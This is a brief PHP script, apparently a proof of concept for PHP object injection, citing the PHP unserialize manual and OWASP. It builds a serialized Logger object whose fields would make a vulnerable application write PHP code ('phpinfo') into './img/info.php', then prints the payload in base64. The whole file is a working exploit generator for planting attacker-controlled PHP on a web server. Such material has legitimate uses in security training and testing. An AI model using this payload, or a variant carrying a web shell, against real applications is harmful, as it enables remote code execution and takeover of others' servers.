<?php
# Ref: http://php.net/manual/en/function.unserialize.php
#      https://www.owasp.org/index.php/PHP_Object_Injection
#

class Logger {
    private $logFile;
    private $exitMsg;

    function __construct($file){
        $this->exitMsg = '<?php phpinfo(); ?>';
        $this->logFile = "./img/info.php";
    }
}

print base64_encode(serialize(new Logger));


?>
